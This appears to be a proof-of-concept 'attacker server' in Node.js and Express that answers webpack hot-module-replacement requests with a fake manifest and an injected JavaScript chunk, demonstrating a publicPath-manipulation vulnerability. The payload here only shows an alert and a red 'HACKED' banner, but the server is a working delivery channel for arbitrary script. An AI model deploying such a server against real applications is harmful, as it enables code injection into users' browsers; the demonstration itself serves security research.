const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 3333;

app.use(cors());

// Log requests
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// Serve HMR manifest
app.get('/*.hot-update.json', (req, res) => {
  console.log('🎯 HMR manifest requested!');
  res.json({
    c: ["main"],
    r: [],
    m: []
  });
});

// Serve malicious HMR update chunk
app.get('/*.hot-update.js', (req, res) => {
  console.log('🚨 Malicious HMR chunk requested!');
  
  const maliciousCode = `
    console.error('🚨 HACKED! publicPath was manipulated!');
    alert('⚠️ SECURITY DEMO: Your app has been compromised via publicPath manipulation!');
    
    // Display warning banner
    const banner = document.createElement('div');
    banner.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; background: red; color: white; padding: 20px; z-index: 9999; text-align: center;';
    banner.innerHTML = '<h2>⚠️ HACKED! This demonstrates the publicPath vulnerability!</h2>';
    document.body.appendChild(banner);
  `;
  
  res.type('application/javascript');
  res.send(maliciousCode);
});

app.listen(PORT, () => {
  console.log(`
🦹 Attacker Server Started!
================================
Server is running on http://localhost:${PORT}
Waiting for HMR requests...
================================
  `);
});